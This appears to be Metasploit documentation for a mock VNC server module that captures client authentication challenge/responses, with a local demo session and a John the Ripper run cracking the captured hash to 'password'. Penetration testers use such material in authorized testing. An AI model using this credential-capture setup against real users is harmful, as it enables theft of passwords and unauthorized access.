This module creates a mock VNC server which accepts credentials.  Upon receiving a login attempt, an `Authentication failure` error is thrown.

## Verification Steps

  1. Start msfconsole
  2. Do: ```use auxiliary/server/capture/vnc```
  3. Do: ```run```

## Options

  **CHALLENGE**

  The 16 byte challenge used in the authentication.  Default is `00112233445566778899aabbccddeeff`.

  **JOHNPWFILE**

  Write a file containing a John the Ripper format for cracking the credentials.  Default is ``.

  **SSL**

  Boolean if SSL should be used.  Default is `False`.

  **SSLCert**

  File path to a combined Private Key and Certificate file.  If not provided, a certificate will be automatically
  generated.  Default is ``.

## Scenarios

### VNC with vncviewer and JTR Cracking

Server, Client:

```
msf5 > use auxiliary/server/capture/vnc 
msf5 auxiliary(server/capture/vnc) > use auxiliary/server/capture/vnc 
msf5 auxiliary(server/capture/vnc) > set johnpwfile /tmp/john
johnpwfile => /tmp/john
msf5 auxiliary(server/capture/vnc) > run
[*] Auxiliary module running as background job 0.
msf5 auxiliary(server/capture/vnc) > 
[*] Started service listener on 0.0.0.0:5900 
[*] Server started.

msf5 auxiliary(server/capture/vnc) > vncviewer 127.0.0.1
[*] exec: vncviewer 127.0.0.1

Connected to RFB server, using protocol version 3.7
Performing standard VNC authentication
Password: 
Authentication failure

[+] 127.0.0.1:40240 - Challenge: 00112233445566778899aabbccddeeff; Response: b7b9c87777661a7a2299733209bfdfce
```

John the Ripper (JTR) Cracker:

```
msf5 auxiliary(server/capture/vnc) > john /tmp/john_vnc
[*] exec: john /tmp/john_vnc

Using default input encoding: UTF-8
Loaded 1 password hash (VNC [DES 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (?)
1g 0:00:00:00 DONE 2/3 (2018-11-11 20:38) 25.00g/s 75.00p/s 75.00c/s 75.00C/s password
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
